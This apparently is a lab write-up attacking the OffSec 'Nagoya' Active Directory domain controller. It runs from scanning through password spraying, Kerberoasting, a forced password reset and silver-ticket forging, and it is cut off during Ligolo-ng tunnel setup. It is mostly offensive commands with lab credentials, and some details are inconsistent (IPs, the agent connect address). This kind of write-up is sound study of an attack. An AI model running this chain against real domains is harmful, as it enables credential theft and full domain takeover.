lab nagoya

target  192.168.55.21

```bash
sudo nmap -sC -sV nagoya -sT -vvv -p- -Pn -T5 --min-rate=5000
```
```bash
PORT      STATE SERVICE           REASON  VERSION
53/tcp    open  domain            syn-ack Simple DNS Plus
80/tcp    open  http              syn-ack Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 9200225B96881264E6481C77D69C622C
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Nagoya Industries - Nagoya
88/tcp    open  kerberos-sec      syn-ack Microsoft Windows Kerberos (server time: 2025-05-15 14:08:14Z)
135/tcp   open  msrpc             syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn       syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?     syn-ack
464/tcp   open  kpasswd5?         syn-ack
593/tcp   open  ncacn_http        syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?          syn-ack
3268/tcp  open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack
3389/tcp  open  ms-wbt-server     syn-ack Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: NAGOYA-IND
|   NetBIOS_Domain_Name: NAGOYA-IND
|   NetBIOS_Computer_Name: NAGOYA
|   DNS_Domain_Name: nagoya-industries.com
|   DNS_Computer_Name: nagoya.nagoya-industries.com
|   DNS_Tree_Name: nagoya-industries.com
|   Product_Version: 10.0.17763
5985/tcp  open  http              syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            syn-ack .NET Message Framing
49666/tcp open  msrpc             syn-ack Microsoft Windows RPC
49668/tcp open  msrpc             syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http        syn-ack Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc             syn-ack Microsoft Windows RPC
49681/tcp open  msrpc             syn-ack Microsoft Windows RPC
49691/tcp open  msrpc             syn-ack Microsoft Windows RPC
49698/tcp open  msrpc             syn-ack Microsoft Windows RPC
49717/tcp open  msrpc             syn-ack Microsoft Windows RPC
```

<img width="1062" height="21" alt="image" src="https://github.com/user-attachments/assets/390cb2ac-6112-422e-9d13-e48a83697fff" />

As you can see, this machine is likely a Windows Domain Controller, since port 88/tcp (Kerberos) is open — which is typically used for Active Directory authentication.

<img width="436" height="30" alt="image" src="https://github.com/user-attachments/assets/9647a2cd-29cb-4e21-a55f-203d08506d09" />


First, we add the domain name nagoya-industries.com and the DC hostname nagoya to our /etc/hosts file.


<img width="710" height="29" alt="image" src="https://github.com/user-attachments/assets/d591077e-f448-485a-bf1f-289f01eaa179" />

we can see that there is a web port 80 is open. Open it in web browser and investigate


<img width="1229" height="763" alt="image" src="https://github.com/user-attachments/assets/2379637e-d5a3-4353-ab1d-399a1d538d06" />

We then check the /Team tab and notice an absolutely enormous list of possible users.

<img width="1222" height="809" alt="image" src="https://github.com/user-attachments/assets/e792dabf-3742-49d3-b430-ea2116d554c0" />

Making Wordlists

I just copy these users name and save a file named users.txt

<img width="367" height="666" alt="image" src="https://github.com/user-attachments/assets/eea418bb-8002-4b36-bc42-3c9fe4d09060" />


now lets use the impacket script, GetNPUsers to check if any of the user’s are AS-REP roast vulnerable — Which turned out not.

```bash
impacket-GetNPUsers nagoya-industries.com/ -usersfile users.txt
```
<img width="974" height="604" alt="image" src="https://github.com/user-attachments/assets/d11c8143-0e8a-4ae3-8114-0383a726fac0" />


I used the impacket script, GetNPUsers to check if any of the user’s are AS-REP roast vulnerable — WHich turned out not.

Also confirmed that the naming format is the correct one using kerbrute :

```bash
kerbrute userenum -d nagoya-industries.com --dc 192.168.55.21 users.txt
```
<img width="936" height="785" alt="image" src="https://github.com/user-attachments/assets/619d81a0-4972-435f-a8b5-3c9a5a60bffd" />

So now we got valid users, but it’s too much to go through with rockyou.txt , I was honestly lost , but I knew the only way was to guess or brute force a password. I didn’t want to spend too much time and decided to use the first hint for the box in Offsec’s lab.

<img width="828" height="42" alt="image" src="https://github.com/user-attachments/assets/46941be1-c600-4aea-b5d4-3886405f891f" />

Are you serious, seasons + years lol.

Okay OSINT-ing into this box was not my thought of process or methodology at all.

<img width="1598" height="873" alt="image" src="https://github.com/user-attachments/assets/608c7ea0-bda3-461e-b465-1d4bef44adf3" />

So with got a the year ‘2023’, now to guess the season.

<img width="828" height="446" alt="image" src="https://github.com/user-attachments/assets/6214bf73-b359-42f7-b2fd-1f8b90a30854" />

Let’s start with spring first. I’ll use kerbrute again to password spray the users :
```bash
kerbrute passwordspray --dc 192.168.55.21 -d nagoya-industries.com users.txt "spring2023"
```
<img width="1000" height="273" alt="image" src="https://github.com/user-attachments/assets/345b6c43-2927-4053-a9c4-49ae8fe699e8" />


```bash
note command later might be useful
command with nxc to spray the usernames and passwords, and used grep "+" to filter out valid credentials:

nxc smb 192.168.123.21 -u domUsers.txt -p pass.txt --continue-on-success | grep "+"
```

Didn’t work lol, let’s try with a capital s.
<img width="990" height="296" alt="image" src="https://github.com/user-attachments/assets/a001b2e3-515f-4da7-85fb-500844512e59" />

Got out first credential :

Craig.Carr:Spring2023=

Password Spraying

Now that we had a set of matching creds we could go ahead and start spraying the creds to see what’s up.

now let’s enumerate the user using crackmapexec :

```bash
crackmapexec smb 192.168.55.21 -u Craig.Carr -d nagoya-industries.com  -p "Spring2023" --shares
```
another command
```bash
nxc rdp nagoya -u 'craig.carr' -p 'Spring2023'
```

<img width="1057" height="247" alt="image" src="https://github.com/user-attachments/assets/49e1cd0c-766c-44de-9d0c-80bcbaa764b7" />

Alright SMB works,

I like to check if we can get a shell via winrm :

crackmapexec smb 192.168.55.21 -u Craig.Carr -d nagoya-industries.com  -p "Spring2023"

<img width="1056" height="101" alt="image" src="https://github.com/user-attachments/assets/ca6103ba-c98d-427a-8d2a-fcf503537a56" />

I like to check if we can get a shell via winrm :

```bash
evil-winrm -i 192.168.55.21 -u craig.carr -p "Spring2023"
```
<img width="1254" height="281" alt="image" src="https://github.com/user-attachments/assets/c9eab2e9-321e-44af-831b-bd3f26a5db66" />

No winrm access :(.

Since we get SMB access let’s connect using SMBclient :

<img width="909" height="68" alt="image" src="https://github.com/user-attachments/assets/027d751c-1a6f-4ade-9553-19b100c36434" />

password as we know:  Spring2023

<img width="856" height="788" alt="image" src="https://github.com/user-attachments/assets/37add856-386b-43e1-84bd-475c61240a2f" />

Some of the files could potentially leak some information for us to pivot.

I ended up getting them all and checking them out.

to download file from smb to linux
```bash
get ResetPassword.exe.config
```
<img width="1255" height="89" alt="image" src="https://github.com/user-attachments/assets/0f88ba92-bb74-4407-a957-72af1f8ab620" />

<img width="922" height="190" alt="image" src="https://github.com/user-attachments/assets/1162fdd2-1ce1-4dff-be7b-f877690f65b6" />

Reverse Engineering

Obviously we aren’t able to read the other files using cat since they’re .exe and .dll files, so instead we use the strings command:

```bash
strings -e l ResetPassword.exe
```

<img width="679" height="711" alt="image" src="https://github.com/user-attachments/assets/6090f984-9859-4ab7-b00f-69fceb962568" />

Well look at that we found another user!

```bash
svc_helpdesk
U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
```

Kerberoasting

I now had another valid set of creds so I could kerberoast sine creds:

```bash
impacket-GetUserSPNs -dc-ip 192.168.55.21 -request nagoya-industries.com/svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg -outputfile hashes.txt
```
<img width="1183" height="241" alt="image" src="https://github.com/user-attachments/assets/73ddfaf7-9733-445b-a757-da4ab5d32955" />

From this I was able to gather the svc_mssql user.

We can now go on to crack the hashes using john:

```bash
john --format=krb5tgs hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="1151" height="240" alt="image" src="https://github.com/user-attachments/assets/9871a3b8-6b54-4a8c-9e00-881b00c81cd0" />

```bash
svc_mssql
Service1
```

BloodHound
Set Up

```bash
bloodhound-ce-python -d nagoya-industries.com -u Craig.Carr -p "Spring2023" -ns 192.168.55.21 -c all
```

<img width="1187" height="613" alt="image" src="https://github.com/user-attachments/assets/33fa5845-1ba3-4b62-a3c0-957c62a56e4b" />

I use the above .json files and find a bunch of data which I can now ingest in my browser:
Once ingested I go ahead and get everything organized, let’s see who we need to reach and how.

<img width="1406" height="521" alt="image" src="https://github.com/user-attachments/assets/331562bc-1fd7-4d79-954e-b300f7a6e604" />

From here we see only one user that has access to interesting groups:

<img width="1010" height="470" alt="image" src="https://github.com/user-attachments/assets/42afa678-5a63-4fda-b5b0-160b566ee0b7" />

Here, we can see that our svc_helpdesk account is a member of the HELPDESK group. One of the HELPDESK users has GenericAll rights over the christopher.lewis user, and he is a member of the Remote Management Users group — which means we might be able to use WinRM to get a shell through him.

So, let’s abuse this relationship and change Christopher’s password, since our svc_helpdesk account has GenericAll rights over him.

also i check out the options of abuse here:

<img width="351" height="762" alt="image" src="https://github.com/user-attachments/assets/c539c916-b72c-4b91-a5d0-15da67acca50" />

I end up choosing the Force Change Password method and see if it hopefully works:


Password Reset & Access Validation (Active Directory Abuse Example)

This demonstrates a common privilege abuse technique in an AD environment:

Force-reset a target user's password using a privileged service account (svc_helpdesk) that has the necessary rights (e.g. "Force Change Password" / User-Force-Change-Password extended right).

```bash
net rpc password "christopher.lewis" "Pass@123" -U 'nagoya-industries.com'/'svc_helpdesk'%"U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S "192.168.55.21"
```
<img width="1233" height="76" alt="image" src="https://github.com/user-attachments/assets/06a83a42-91be-445c-ad2b-dcd3baf43675" />


Validate the new credentials via RDP (Remote Desktop) using NetExec (nxc / formerly CrackMapExec).

```bash
nxc rdp nagoya -u "christopher.lewis" -p "Pass@123"
```
<img width="1229" height="128" alt="image" src="https://github.com/user-attachments/assets/cfd04d17-83fc-44f8-840b-8909389a4f5b" />

Validate the same credentials via WinRM (Windows Remote Management) — successful authentication here typically means remote command/PowerShell execution is possible.
```bash
nxc winrm nagoya -u "christopher.lewis" -p "Pass@123"
```
<img width="1309" height="213" alt="image" src="https://github.com/user-attachments/assets/1e77b5f6-f841-46e4-9682-9d2d59e20850" />


Quick Summary

Technique: Password reset abuse via RPC using a helpdesk/service account with delegated rights.
Target user: christopher.lewis@ nagoya-industries.com
New password set: Pass@123
Successful access achieved on host nagoya (via both RDP and WinRM).
Real-world context: This pattern is frequently seen in red-team / pentest engagements when helpdesk accounts are over-privileged in Active Directory.



Foothold
Shell as Christopher
```bash
evil-winrm -u christopher.lewis -p 'Pass@123' -i nagoya
```
<img width="1305" height="303" alt="image" src="https://github.com/user-attachments/assets/ff8f6b1e-1a7c-4162-950b-779aa4e15970" />

We now finally had access and could start the rest of our enumeration process.

<img width="969" height="544" alt="image" src="https://github.com/user-attachments/assets/5bf5b33a-546d-4eab-a260-acf059b0dd3a" />

<img width="737" height="276" alt="image" src="https://github.com/user-attachments/assets/a6b81e05-edc4-4679-a08f-8a95c28c4ed4" />

It was here that I was getting stuck because I didn’t know what to do next, I tried the mssql RCE approach but that didn’t work.

CREATING A SILVER TICKET

I had to look at the last hint which mentioned creating a silver ticket.

Note: Since I’ve never done this before I heavily checked a walkthrough here.

The premise would look like this:

<img width="623" height="155" alt="image" src="https://github.com/user-attachments/assets/bc3e943f-9feb-41cc-8c75-d7715d1d69c1" />

To do this we need the following:

    SPN password hash,
    Domain SID,
    and Target SPN of the service account you’ve compromised

Domain SID


<img width="1333" height="647" alt="Screenshot 2026-03-07 223459" src="https://github.com/user-attachments/assets/df905281-dd1b-4c9a-82ad-06e3d9f598ab" />

<img width="740" height="18" alt="Screenshot 2026-03-07 223550" src="https://github.com/user-attachments/assets/7632683f-b0bd-48a5-8036-b94c67a7b3b8" />

SPN Password Hash

<img width="583" height="525" alt="image" src="https://github.com/user-attachments/assets/af82ca73-d2b2-499c-ab84-7e71c1a0aa39" />

```bash
E3A0168BC21CFB88B95C954A5B18F57C
```

Later, we obtained the Administrator ticket using impacket‑ticketer

```bash
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid "S-1-5-21-1969309164-1513403977-1686805993" -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com Administrator
```
<img width="1483" height="376" alt="image" src="https://github.com/user-attachments/assets/bed69b42-f092-417b-abe5-1985bc2fcfc8" />

```bash
export KRB5CCNAME=Administrator.ccache
```

Now we can use the silver ticket to connect via Kerberos

And now create this file:
```bash
sudo nano /etc/krb5user.conf
```
```bash
[libdefaults]
        default_realm = NAGOYA-INDUSTRIES.COM
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
    rdns = false
    dns_canonicalize_hostname = false
        fcc-mit-ticketflags = true

[realms]
        NAGOYA-INDUSTRIES.COM = {
                kdc = nagoya.nagoya-industries.com
        }

[domain_realm]
        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```
Once that is done we can move on to port forwarding and gaining access via mssql.
Admin Privilege Escalation:
Port Forwarding Using Ligolo-ng:

To access the SQL Server running on the Domain Controller, I used Ligolo-ng to set up a secure tunnel and forward port 1433 to my attacker machine.

🛠 Step 1: Set up the TUN interface on your attacker machine:

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```
    This creates a virtual network interface that Ligolo-ng will use for tunneling.

🛠 Step 2: Start the Ligolo proxy on your attacker machine:
```bash
sudo ./proxy -selfcertt
```
<img width="1072" height="334" alt="image" src="https://github.com/user-attachments/assets/75ed26d7-e5a9-4f50-befd-04f33797fa57" />

🛠 Step 3: Run the Ligolo relay (agent) on the target machine:

First, upload the Ligolo-ng agent binary (compiled for Windows) to the target (e.g., via evil-winrm upload), then run it:

```bash
/agent.exe -connect 192.168.55.21:11601 -ignore-cert
```
